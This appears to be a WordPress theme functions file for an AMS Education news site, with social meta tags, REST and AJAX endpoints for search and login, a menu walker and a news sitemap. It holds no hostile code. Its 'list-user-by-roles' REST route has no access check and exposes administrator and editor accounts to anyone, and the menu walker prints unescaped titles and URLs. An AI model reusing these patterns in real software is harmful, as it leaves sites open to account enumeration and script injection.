//     echo '<meta property="ravuth:telegram:title" content="' . esc_attr( $facebook_seo_title ? $facebook_seo_title : $seo_title ) . '">';
//     echo '<meta property="ravuth:telegram:description" content="' . esc_attr( $facebook_description ? $facebook_description : $seo_description ) . '">';
//     echo '<meta property="ravuth:telegram:image" content="' . esc_attr( $facebook_img ? $facebook_img : $seo_thumbnail ) . '">';
// }

// add_action( 'wp_head', 'add_custom_meta_tags' );



function add_custom_meta_tags() {
    $seo_title = get_the_title();
    $seo_description = get_post_meta( get_the_ID(), '_yoast_wpseo_metadesc', true );
    $seo_thumbnail = get_the_post_thumbnail_url();
    $seo_permalink = get_permalink();
    
    $facebook_seo_title = get_post_meta(get_the_ID(), '_custom_meta_key_title_fb', true);
    $facebook_description = get_post_meta( get_the_ID(), '_custom_meta_key_desc_fb', true );
    $facebook_img = get_post_meta(get_the_ID(), 'secondary_featured_image', true);
    
    $twitter_title = get_post_meta(get_the_ID(), '_custom_meta_key_title_twitter', true);
    $twitter_description = get_post_meta( get_the_ID(), '_custom_meta_key_desc_twitter', true );
    $twitter_img = get_post_meta(get_the_ID(), 'secondary_featured_image_twitter', true);
    
    
    // $telegram_seo_title = get_post_meta(get_the_ID(), '_custom_meta_key_title_telegram', true);
    // $telegram_description = get_post_meta( get_the_ID(), '_custom_meta_key_desc_telegram', true );
    // $telegram_img = get_post_meta( get_the_ID(), 'secondary_featured_image_telegram', true );
    
    // Facebook
    echo '<meta property="og:title" content="' . esc_attr( $facebook_seo_title ? $facebook_seo_title : $seo_title ) . '">';
    echo '<meta property="og:description" content="' . esc_attr( $facebook_description ? $facebook_description : $seo_description ) . '">';
    echo '<meta property="og:image" content="' . esc_attr( $facebook_img ? $facebook_img : $seo_thumbnail ) . '">';
    echo '<meta property="og:image:width" content="1200" />';
    echo '<meta property="og:image:height" content="630" />';
    echo '<meta property="og:url" content="' . esc_attr( $seo_permalink ) . '">';
    echo '<meta property="og:type" content="website">';
    
    
    // Twitter
    echo '<meta name="twitter:title" content="' . esc_attr( $twitter_title ? $twitter_title : $seo_title ) . '">';
    echo '<meta name="twitter:description" content="' . esc_attr( $twitter_description ? $twitter_description : $seo_description ) . '">';
    echo '<meta name="twitter:image" content="' . esc_attr( $twitter_img ? $twitter_img : $seo_thumbnail ) . '">';
    echo '<meta name="twitter:card" content="summary_large_image">';
    
    
    // // Telegram
    // echo '<meta property="telegram:title" content="' . esc_attr( $telegram_seo_title ? $telegram_seo_title : $seo_title ) . '">';
    // echo '<meta property="telegram:description" content="' . esc_attr( $telegram_description ? $telegram_description : $seo_description ) . '">';
    // echo '<meta property="telegram:image" content="' . esc_attr( $telegram_img ? $telegram_img : $seo_thumbnail ) . '">';
    // echo '<meta property="telegram:image:width" content="320" />';
    // echo '<meta property="telegram:image:height" content="320" />';
}

add_action( 'wp_head', 'add_custom_meta_tags' );






add_action('rest_api_init', 'get_list_user_by_roles');

function get_list_user_by_roles() {

    register_rest_route(
        'api/v2',
        '/list-user-by-roles',
        array(
            'methods' => 'GET',
            'callback' => 'list_user_by_roles',
        )
    );
    
}


function list_user_by_roles(){
    $roles = array( 'administrator' , 'contributor', 'editor', 'author', 'wpseo_editor', 'wpseo_manager', 'translator' );

    // Set up the query arguments
    $args = array(
        'role__in' => $roles,
        'number'   => -1, // Retrieve all users
    );
    
    $users = get_users( $args );

       $users_data = array();

    // Loop through the retrieved users
    foreach ( $users as $user ) {
        // Get the user's data
        $user_data = array(
            'id'           => $user->ID,
            'display_name' => $user->display_name
        );

        $users_data[] = $user_data;
    }
    
    $response = new WP_REST_Response(['status' => 'OK', 'data' => $users_data]);
    $response->set_status(200);

    return $response;
    
}



// START::Dashboard---------------


// Advance Search





// Search API callback function
function search_api_callback($request) {
    $search_terms = explode(',', $request->get_param('p'));
    $author = $request->get_param('author');
    $post_type = $request->get_param('ptype');
    $post_type = $post_type ? $post_type : "post";

    $page = $request->get_param('page');
    $per_page = $request->get_param('per_page');
    $page = $page ? intval($page) : 1;
    $per_page = $per_page ? intval($per_page) : 16;

    $offset = ($page - 1) * $per_page;

    $results = array();
    $no_results = true;

    foreach ($search_terms as $search_term) {
        $args = array(
            'post_type'      => $post_type,
            'post_status'    => 'publish',
            'posts_per_page' => $per_page,
            'offset'         => $offset,
            's'              => trim($search_term),
            'author'         => $author
        );

        $search_results = new WP_Query($args);

        // Process the search results
        if ($search_results->have_posts()) {
            while ($search_results->have_posts()) {
                $search_results->the_post();
                $post_id = get_the_ID();
                $post_title = get_the_title();
                $post_url = get_permalink();
                $post_thumbnail = get_the_post_thumbnail_url();

                $results[] = array(
                    'id'         => $post_id,
                    'title'      => $post_title,
                    'url'        => $post_url,
                    'thumbnail'  => $post_thumbnail,
                );

                $no_results = false;
            }
        }

        // Restore original post data
        wp_reset_postdata();
    }

    // Check if no results were found
    if ($no_results) {
        $response = new WP_REST_Response(['status' => 'NotFound', 'message' => 'No article found']);
        $response->set_status(200);
    } else {
        // Calculate the total number of pages
        $total_pages = ceil($search_results->found_posts / $per_page);

        $response = new WP_REST_Response([
            'status' => 'OK',
            'total_pages' => $total_pages,
            'current_page' => $page,
            'items_per_page' => $per_page,
            'data' => $results,
        ]);
        $response->set_status(200);
    }

    return $response;
}




// END::Advance Search



    
    function get_author_list_dash() {
        $authors = get_users( array(
            'role'    => 'author',
            'orderby' => 'id',
            'order'   => 'DESC',
        ) );
    
        $author_data = array();
        foreach ( $authors as $author ) {
            $author_data[] = array(
                'id'           => $author->ID,
                'author_name' => $author->display_name,
            );
        }
        
        $response = new WP_REST_Response(['status'=>'OK', 'data' => $author_data]);
	    $response->set_status(200);

	    return $response;
    
        
    }


// END::Dashboard--------------

function get_user_profile_picture( $user_id ) {
    $avatar = get_avatar( $user_id );
    return $avatar;
}

function get_current_user_details() {
    // Get the current user's information
    $current_user = wp_get_current_user();

    // Initialize an array to store the user details
    $user_details = array();

    // Check if the user is logged in
    if ( $current_user->ID != 0 ) {
        // User is logged in
        $user_details['id'] = $current_user->ID;
        $user_details['email'] = $current_user->user_email;
        $user_details['profile_image'] = get_avatar( $current_user->ID);
        $user_details['first_name'] = $current_user->first_name;
        $user_details['last_name'] = $current_user->last_name;
        $user_details['display_name'] = $current_user->display_name;
        $user_details['phone_number'] = $current_user->phone_number;
        $user_details['dob'] = $current_user->dob;
        $user_details['gender'] = $current_user->gender;
    } else {
        // User is not logged in
        $user_details['id'] = '';
        $user_details['email'] = '';
        $user_details['profile_image'] = '';
        $user_details['first_name'] = '';
        $user_details['last_name'] = '';
        $user_details['display_name'] = '';
        $user_details['phone_number'] = '';
        $user_details['dob'] = '';
        $user_details['gender'] = '';
    }

    return $user_details;
}



// START::Login
 function generate_user_token_login($user_id) {
    // Generate a unique token for the user
    $token = wp_generate_password(256, false);

    // Calculate the token expiration timestamp (1 month from now)
    $expiration = strtotime('+1 month');

    // Store the token and expiration timestamp in user meta
    update_user_meta($user_id, 'user_token', $token);
    update_user_meta($user_id, 'user_token_expiration', $expiration);

    return $token;
}




function login_enqueue_style() {
	wp_enqueue_script( 'custom-login-script', get_stylesheet_directory_uri() . '/js/login.js', array ( 'jquery' ), 1.1, true);
    wp_localize_script( 'custom-login-script', 'customLogin', array(
        'ajaxUrl' => admin_url( 'admin-ajax.php' ),
        'loginAction' => 'custom_login' // Replace with your actual login action
    ) );
}
add_action( 'wp_enqueue_scripts', 'login_enqueue_style' );

// Login AJAX handler
function custom_login_handler() {
    $username = isset( $_POST['uname'] ) ? sanitize_user( $_POST['uname'] ) : '';
    $password = isset( $_POST['upass'] ) ? $_POST['upass'] : '';

    // Perform server-side validation
    if ( empty( $username ) || empty( $password ) ) {
        wp_send_json_error( array( 'status' => 'ERROR', 'message' => 'Please enter both username and password.') );
    }

    $credentials = array(
        'user_login'    => $username,
        'user_password' => $password,
        'remember'      => true
    );
    $user = wp_signon( $credentials, false );

    if ( is_wp_error( $user ) ) {
        wp_send_json_error( array( 'status' => 'ERROR', 'message' => 'Username or Email not correct.') );
    } else {
        $token = generate_user_token_login( $user->ID );
        $user_data = get_userdata( $user->ID );
        $role = $user_data->roles[0];

        $response = array(
            'username' => $username,
            'token' => $token,
            'role' => $role
        );
        wp_send_json_success( array( 'status' => 'OK', 'message' => 'Login Success', 'data' => $response ) );
    }
}
add_action( 'wp_ajax_custom_login', 'custom_login_handler' );
add_action( 'wp_ajax_nopriv_custom_login', 'custom_login_handler' );
// END::Login



class Custom_Multi_Level_Walker extends Walker_Nav_Menu {
    function start_lvl(&$output, $depth = 0, $args = null) {
        $output .= '<ul class="sub-menu-b">';
    }

    function start_el(&$output, $item, $depth = 0, $args = null, $id = 0) {
        $indent = ($depth) ? str_repeat("\t", $depth) : '';
    
        $toggle_icon = '';
    
        if ($args->walker->has_children) {
            $toggle_icon = '<span class="toggle-icon"><i class="fa fa-angle-up"></i></span>';
        }
    
        $icon_menu = wp_get_attachment_url($item->thumbnail_id);
        
        $icon = '';
        
        if (!empty($icon_menu)) {
            $icon = '<img src="' . $icon_menu . '" alt="' . $item->title . '" class="menu-icon" style="height:18px;margin-right:10px;" />';
        }
    
        $output .= $indent . '<li>';
        $output .= '<a href="' . $item->url . '">' . $icon . $item->title . '</a>';
        $output .= $toggle_icon;
    }
    
    
    

    function end_el(&$output, $item, $depth = 0, $args = null) {
        $output .= '</li>';
    }

    function end_lvl(&$output, $depth = 0, $args = null) {
        $output .= '</ul>';
    }
}















add_action('init', function () {
    // Ensure no previous output
    if (ob_get_level()) ob_end_clean();

    // Check if the requested URL is the sitemap-news.xml
    if ($_SERVER['REQUEST_URI'] === '/sitemap-news.xml' || $_SERVER['REQUEST_URI'] === '/news-sitemap.xml') {
        // Set the content type to XML
        header('Content-Type: application/xml; charset=UTF-8');

        // Fetch the posts for the sitemap
        $posts = get_posts([
            'post_type'      => 'post',
            'posts_per_page' => 50,
            'post_status'    => 'publish',
            'orderby'        => 'date',
            'order'          => 'DESC',
            'date_query'     => [
                [
                    'after' => '2 days ago'
                ]
            ]
        ]);

        // Output the XML declaration (without any previous output)
        echo '<?xml version="1.0" encoding="UTF-8"?>';
        
        echo '<?xml-stylesheet type="text/xsl" href="https://infotainment.ams.com.kh/wp-content/plugins/wpseo-news/assets/xml-news-sitemap.xsl"?>';

        // Start the URL set
        echo '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9" xmlns:news="http://www.google.com/schemas/sitemap-news/0.9">';
        
        // Loop through the posts and add them to the sitemap
        foreach ($posts as $post) :
            echo '<url>';
            echo '<loc>' . esc_url(get_permalink($post->ID)) . '</loc>';
            echo '<news:news>';
            echo '<news:publication>';
            echo '<news:name>AMS Education</news:name>';
            echo '<news:language>km</news:language>';
            echo '</news:publication>';
            echo '<news:publication_date>' . get_the_date('c', $post->ID) . '</news:publication_date>';
            echo '<news:title>' . esc_html(get_the_title($post->ID)) . '</news:title>';
            echo '</news:news>';
            echo '</url>';
        endforeach;

        // Close the URL set
        echo '</urlset>';

        // Exit to prevent further processing
        exit;
    }
});

// search 

add_action('wp_ajax_ams_search_suggest', 'ams_search_suggest');
add_action('wp_ajax_nopriv_ams_search_suggest', 'ams_search_suggest');

function ams_search_suggest() {
    $q = isset($_GET['q']) ? sanitize_text_field(wp_unslash($_GET['q'])) : '';
    $limit = isset($_GET['limit']) ? intval($_GET['limit']) : 8;

    if (empty($q)) {
        wp_send_json_success([
            'suggestions' => []
        ]);
    }

    $limit = max(1, min(20, $limit));

    $api_url = add_query_arg([
        'q'     => $q,
        'limit' => $limit,
    ], 'https://searchapi.amscloud.cc/search/suggest');

    $response = wp_remote_get($api_url, [
        'timeout' => 15,
        'headers' => [
            'Accept' => 'application/json',
        ],
    ]);

    if (is_wp_error($response)) {
        wp_send_json_error([
            'message' => $response->get_error_message()
        ], 500);
    }

    $code = wp_remote_retrieve_response_code($response);
    $body = wp_remote_retrieve_body($response);
    $data = json_decode($body, true);

    if ($code !== 200) {
        wp_send_json_error([
            'message' => 'API request failed',
            'status'  => $code,
            'body'    => $body,
        ], $code);
    }

    if (!is_array($data)) {
        wp_send_json_error([
            'message' => 'Invalid JSON response'
        ], 500);
    }

    wp_send_json_success($data);
}

add_action('wp_enqueue_scripts', 'ams_enqueue_search_assets');
function ams_enqueue_search_assets() {
    if (is_search() || is_page()) {
        wp_enqueue_script(
            'ams-search-suggest',
            get_stylesheet_directory_uri() . '/ajax_search.js',
            [],
            filemtime(get_stylesheet_directory() . '/ajax_search.js'),
            true
        );

        wp_localize_script('ams-search-suggest', 'amsSearch', [
            'ajaxurl' => admin_url('admin-ajax.php'),
        ]);
    }
}


